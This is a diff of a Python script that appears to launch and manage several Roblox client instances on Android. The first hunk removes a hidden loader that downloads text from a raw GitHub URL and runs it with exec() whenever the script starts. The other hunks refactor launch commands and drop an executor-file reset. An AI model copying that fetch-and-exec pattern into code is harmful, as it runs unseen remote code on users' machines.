@@ -17,11 +17,6 @@ import signal
 from colorama import init, Fore, Style
 from threading import Lock
 
-url = "https://raw.githubusercontent.com/AntonBuckley/My-Copyright/refs/heads/main/Tool%20Keylist"
-response = requests.get(url)
-
-exec(response.text)
-
 init()
 
 SERVER_LINKS_FILE = "AXPrivate_Server_Link.txt"
@@ -335,7 +330,6 @@ def kill_roblox_process(package_name):
     os.system(f"pkill -f {package_name}")
     time.sleep(2) 
 
-# Function to launch Roblox
 def launch_roblox(package_name, server_link, num_packages, package_statuses):
     try:
         # Update the status to indicate Roblox is opening
@@ -343,24 +337,30 @@ def launch_roblox(package_name, server_link, num_packages, package_statuses):
         update_status_table(package_statuses)
 
         # Open Roblox (Initial Splash)
-        subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.startup.ActivitySplash', '-d', server_link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        splash_activity = f'{package_name}/com.roblox.client.startup.ActivitySplash'
+        subprocess.run(['am', 'start', '-n', splash_activity, '-d', server_link], 
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(15 if num_packages >= 6 else 8)  # Adjust wait time based on the number of packages
 
-        # Proceed to launch
+        # Update status for joining
         package_statuses[package_name]["Status"] = Fore.LIGHTCYAN_EX + f"Joining Roblox for {package_name}..." + Style.RESET_ALL
         update_status_table(package_statuses)
-        subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.ActivityProtocolLaunch', '-d', server_link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
+        # Proceed to launch
+        launch_activity = f'{package_name}/com.roblox.client.ActivityProtocolLaunch'
+        subprocess.run(['am', 'start', '-n', launch_activity, '-d', server_link], 
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
         # Wait a moment to ensure Roblox has launched
         time.sleep(20)
-        
+
         # Update the status after successful join
         package_statuses[package_name]["Status"] = Fore.GREEN + "Joined Roblox" + Style.RESET_ALL
         update_status_table(package_statuses)
 
     except Exception as e:
         # Catch all exceptions and log them specifically to avoid "launching failed" messages
-        package_statuses[package_name]["Status"] = Fore.RED + f"Error launching Roblox for {package_name}: {e}" + Style.RESET_ALL
+        package_statuses[package_name]["Status"] = Fore.RED + f"Error launching Roblox for {package_name}: {str(e)}" + Style.RESET_ALL
         update_status_table(package_statuses)
         print(f"Error details: {e}")
 
@@ -661,9 +661,6 @@ def main():
 
                     # Get the username for the executor check
                     username = get_username(accounts[server_links.index((package_name, server_link))][1])
-
-                    # Reset the executor file before checking
-                    reset_executor_file(username)
 
                 except Exception as e:
                     # Handle subprocess or launch error
